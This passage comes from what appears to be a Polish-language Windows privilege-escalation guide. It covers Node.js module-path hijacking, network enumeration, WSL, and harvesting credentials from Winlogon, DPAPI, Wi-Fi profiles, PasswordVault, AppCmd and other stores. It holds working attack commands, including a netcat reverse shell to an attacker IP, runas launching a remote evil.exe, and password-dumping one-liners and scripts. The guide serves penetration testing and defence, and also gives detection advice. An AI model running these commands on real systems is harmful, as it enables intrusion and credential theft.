for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak nadużyć tej kontroli:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w systemie Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują one bare import, taki jak `require("foo")`, a oczekiwanego modułu **brakuje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W systemie Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik z niskimi uprawnieniami** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i czekać, aż **proces Node/Electron z wyższymi uprawnieniami** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście zabezpieczeń procesu ofiary, co prowadzi do **LPE**, jeśli cel działa jako administrator, w ramach podwyższonego zadania harmonogramu/usługi lub jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet został usunięty z buildów produkcyjnych, pominięty podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny celu (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Filtruj według `Path` `contains` `node_modules`
- Skup się na zdarzeniach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** za pomocą Procmon lub przeglądu kodu źródłowego.
2. Utwórz katalog wyszukiwania w katalogu głównym, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowy moduł będzie nieobecny, Node może załadować `C:\node_modules\foo.js`.

Przykłady brakujących modułów opcjonalnych występujących w rzeczywistych przypadkach, które pasują do tego wzorca, to `bluebird` i `utf-8-validate`. Jednak **technika** jest uniwersalna: znajdź dowolny **import bez ścieżki**, którego nie ma, a który uprzywilejowany proces Windows Node/Electron spróbuje rozwiązać.

### Wykrywanie i zabezpieczenia

- Generuj alerty, gdy użytkownik utworzy `C:\node_modules` lub zapisze tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące pliki z `C:\node_modules\*`.
- W środowisku produkcyjnym dołączaj do pakietu wszystkie zależności środowiska uruchomieniowego i sprawdzaj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}`, które nie zgłaszają błędów.
- Wyłączaj opcjonalne testy, jeśli biblioteka na to pozwala (na przykład niektóre wdrożenia `ws` mogą pominąć test starszego modułu `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź inne znane komputery zapisane na stałe w pliku hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz **usługi objęte ograniczeniami**.

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego nasłuchującego procesu powiąż jego PID z właścicielem procesu, ścieżką do pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewniać dostęp jako użytkownik pulpitu tylko wtedy, gdy pozwalają na to jej uwierzytelnianie i mechanizmy kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie o wyższych uprawnieniach to osobny cel analizy: nasłuchujący proces i ścieżka do pliku binarnego to jedynie wskazówki pasywne, natomiast uwierzytelniona ścieżka wykorzystująca błąd uszkodzenia pamięci wymaga analizy dokładnie tego pliku binarnego i dostępnego wejścia. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, przed przypisaniem go do usługi backendowej porównaj wyniki z [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby znaleźć polecenia związane z Firewall**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie...)**

Więcej [poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Podsystem Windows dla systemu Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszej próbie nasłuchiwania na porcie za pomocą `nc.exe` pojawi się okno GUI z pytaniem, czy zezwolić zaporze na działanie programu `nc`).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Konto Linux `root` w WSL samo w sobie nie nadaje uprawnień administratora systemu Windows. Jeśli bieżąca tożsamość systemu Windows może odczytywać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające. Eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; w WSL 2 dystrybucja jest często przechowywana na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal rzeczywistą dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego sprawdzania.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` to znalezisko w rejestrze zawierające hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Źródło: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail i automatycznie logować się w przeglądarkach, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows potrzebująca poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej) **może korzystać z tego Menedżera poświadczeń** i Windows Vault oraz używać dostarczonych poświadczeń, zamiast za każdym razem wymagać od użytkowników podania nazwy użytkownika i hasła.

Jeśli aplikacje nie komunikują się z Menedżerem poświadczeń, nie sądzę, by mogły używać poświadczeń przypisanych do danego zasobu. Jeśli więc aplikacja ma korzystać z sejfu, powinna w jakiś sposób **komunikować się z Menedżerem poświadczeń i pobierać z domyślnego sejfu przechowywania poświadczenia dla danego zasobu**.

Użyj `cmdkey`, aby wyświetlić poświadczenia zapisane na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem poświadczeń.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł Powershells z [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające i hasła w postaci jawnej w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ten obszar przechowywania jest odizolowany dla każdej sesji i można go odszyfrować natywnie bez uprawnień administracyjnych ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników i hasła w postaci jawnej:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który w znacznym stopniu zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z sekretów logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkowników, chronione za pomocą DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, przechowywany razem z kluczem głównym chroniącym klucze prywatne użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, dlatego nie można wyświetlić jego zawartości za pomocą polecenia `dir` w CMD, choć można to zrobić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Dane uwierzytelniające PowerShell

**Dane uwierzytelniające PowerShell** są często używane do **skryptów** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych danych uwierzytelniających. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowany plik z danymi uwierzytelniającymi może mieć dowolną nazwę lub ścieżkę `.xml`. Gdy skrypt lub spis plików wskazuje taki plik, ustal rzeczywisty katalog profilu konta zamiast zakładać, że znajduje się on w `C:\Users`: [profile użytkowników systemu Windows mogą znajdować się w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Możliwość odczytu pliku to tylko wskazówka; [funkcja `Export-Clixml` systemu Windows wiąże zaszyfrowane dane uwierzytelniające z użytkownikiem i komputerem, z których je wyeksportowano](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi dodatkowo mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas rutynowego przeglądu zaszyfrowanych ani jawnych wartości.

Aby **odszyfrować** dane uwierzytelniające PowerShell z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu `dpapi::rdg` w **Mimikatz** z odpowiednim `/masterkey`, aby **odszyfrować wszystkie pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu `sekurlsa::dpapi` w Mimikatz

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takie jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim potraktujesz plik XML jako wskazówkę dotyczącą poświadczeń. Zapisana wartość nie jest hasłem DPAPI/RDCMan; odzyskanie zależy od ustawień szyfrowania pliku i od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego przeszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być też czytelne w katalogach użytkowników lub współdzielonym folderze administracyjnym. Eksport `profiles.xml` ze starszej wersji zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła potraktuj jako wskazówkę dotyczącą poświadczeń, ale nie wyświetlaj jego zawartości ani nie zakładaj, że jest to tekst jawny: [producent podaje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, albo skonfigurowana mniej restrykcyjnie. Zanim zaczniesz na nim polegać, potwierdź pochodzenie pliku i warunki odzyskania.

### Sticky Notes

Użytkownicy czasami zapisują hasła i inne informacje w aplikacjach do notatek samoprzylepnych. Pakietowa aplikacja Sticky Notes firmy Microsoft zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą korzystać z innych magazynów w profilu użytkownika, w tym z LevelDB. Ustal, jaka aplikacja jest zainstalowana i jaki format magazynu wykorzystuje, zanim uznasz brak pliku SQLite za dowód braku notatek.

Jeśli Sticky Notes używa dziennika write-ahead SQLite, sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych, a gdy jest dostępny, dołącz również `plum.sqlite-shm`; indeks pamięci współdzielonej można odbudować, ale plik WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest jedynie wskazówką dotyczącą poświadczeń: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis z menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji specyficznej dla aplikacji, zanim będzie można na jego podstawie stwierdzić, że umożliwia logowanie z wyższymi uprawnieniami.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz być Administratorem i uruchomić proces z poziomem High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano jakieś **poświadczenia**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń w rejestrze narzędzi pomocy technicznej

Niektóre starsze instalacje narzędzi do zdalnej pomocy technicznej zachowują nazwy wartości związane z hasłami pod stałymi kluczami rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer wskazywało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do dalszej weryfikacji: przed oceną tych poświadczeń sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżące zachowanie uwierzytelniania. Użycie hasła do zdalnej pomocy technicznej w celu uzyskania dostępu do bardziej uprzywilejowanego konta Windows wymaga ponadto faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w standardowych wynikach enumeracji.

### Współdzielone arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny współdzielony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Sprawdzaj wyłącznie pliki, do których masz uprawniony dostęp i które są istotne, oraz unikaj wyświetlania potencjalnych sekretów podczas szeroko zakrojonej enumeracji. Sama czytelna ścieżka do pliku `.xlsx`, chroniony arkusz lub ukryta kolumna nie dowodzą, że istnieją tam poświadczenia ani że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane patche zmian na serwerze CI

Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnych; katalog danych można skonfigurować i nie musi on znajdować się w `ProgramData`. Czytelny patch może zachować usunięte lub dodane odwołania do pliku z poświadczeniami, klucza szyfrowania albo skryptu używającego obu. Na przykład przepływ pracy PowerShell `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany osobno. Najpierw sprawdź wyłącznie dostępne nazwy patchy, a następnie, jeśli masz do tego uprawnienia, przejrzyj istotną zawartość bez wyświetlania sekretów w standardowych wynikach enumeracji. Sama ścieżka do patcha, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że istnieją prawidłowe poświadczenia lub dostęp o wyższych uprawnieniach. Ogranicz ACL katalogu danych i unikaj umieszczania sekretów w zmianach kodu kompilacji.

### Niestandardowa rotacja hasła lokalnego administratora

Samodzielnie utworzone narzędzie do rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a poświadczenia magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Oceniaj razem zaplanowane zadanie aktualizatora, konto, ACL konfiguracji, nasłuchujący proces i uprawnienia do magazynu danych. Magazyn danych nasłuchujący wyłącznie na loopback nadal jest osiągalny dla lokalnego użytkownika mającego prawidłowe poświadczenia, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza jest dostępny obok tekstu zaszyfrowanego, przed zaufaniem szyfrowaniu sprawdź dokładne wyprowadzanie klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna za pomocą Go [`math/rand`](https://pkg.go.dev/math/rand), nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest przeznaczony do losowości używanej w kontekstach wrażliwych z punktu widzenia bezpieczeństwa. Przed uznaniem odzyskanego hasła za drogę eskalacji potwierdź, że jest aktualne i należy do konta z lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany blob nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie danych w katalogu lub Entra oraz kontrola dostępu do nich różnią się od niestandardowego lokalnego magazynu danych; [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) również określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa pluginów serwera Java i ponowne użycie poświadczeń

Niektóre pluginy serwera Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelny niestandardowy plugin może zawierać konfigurację lub bytecode z osadzonym poświadczeniem usługi. Przeglądaj archiwum wyłącznie wtedy, gdy masz do tego uprawnienia, i nie umieszczaj odzyskanych sekretów w standardowych wynikach enumeracji. Sama ścieżka do pluginu nie dowodzi, że istnieje w nim sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku instalacji pluginów PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwum — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać `openfire.script` w `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź razem rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) informuje, że hasła mogą być przechowywane jawnym tekstem lub szyfrowane kluczem przechowywanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani możliwości jego odczytu, ani ponownego użycia poświadczeń. Ścieżka jest wskazówką do inwentaryzacji, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w standardowych wynikach enumeracji.

